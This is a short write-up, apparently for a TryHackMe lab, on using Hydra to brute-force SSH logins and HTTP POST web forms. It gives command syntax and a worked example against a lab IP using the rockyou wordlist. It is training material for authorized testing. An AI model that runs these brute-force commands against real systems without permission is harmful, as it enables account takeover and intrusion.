---
date: '2025-02-02T00:07:56+05:30'
draft: false
title: 'Hydra: TryHackMe Password Cracking Guide'
slug: hydra-thm
tags: ["tryhackme", "hydra", "password-cracking", "brute-force", "pentesting"]
category: writeups
showtoc: true
summary: A guide to using Hydra for password cracking against various protocols including SSH and web forms
description: Comprehensive tutorial on using Hydra password cracking tool, with examples for SSH and HTTP POST form attacks
---

# Hydra Password Cracking Guide

## Basic Syntax

When the username is known, use one of these formats:

```bash
hydra -l user -P /path/of/wordlist protocol://ip -t <number-of-threads>
```

or

```bash
hydra -l user -P /path/of/wordlist ip -t <number-of-threads> <protocol>
```

Where:
- `-l user`: Specifies the known username
- `-P /path/of/wordlist`: Path to the password wordlist
- `-t`: Number of parallel connections

## SSH Attacks

For SSH brute forcing:

```bash
hydra -l user -P /path/of/wordlist ip -t <number-of-threads> ssh
```

## Web Form Attacks

For web form attacks, you need to identify the form method (POST/GET) and structure the attack accordingly:

```bash
hydra -l <username> -P <wordlist> <ip> http-post-form "/<form-request-page>:username=^USER^&password=^PASS^:F=<error-message>" -V
```

Example:
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.157.124 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
```

Where:
- `^USER^`: Placeholder for username
- `^PASS^`: Placeholder for password attempts
- `F=`: Failed login message to identify incorrect attempts
- `-V`: Verbose output

## Tips for Success

1. **Thread Management**
   - Start with fewer threads
   - Increase gradually if stable
   - Too many threads can cause errors

2. **Form Analysis**
   - Check form method (POST/GET)
   - Verify parameter names
   - Note exact error messages

3. **Wordlist Selection**
   - Use appropriate wordlists
   - Consider target context
   - Balance size vs. time

4. **Error Messages**
   - Verify failure messages
   - Update if site changes
   - Test manually first

## Best Practices

1. **Legal Considerations**
   - Only use on authorized systems
   - Maintain documentation
   - Follow scope guidelines

2. **Performance**
   - Monitor network stability
   - Adjust thread count accordingly
   - Consider rate limiting

3. **Troubleshooting**
   - Verify target accessibility
   - Check syntax carefully
   - Monitor for blocks/bans
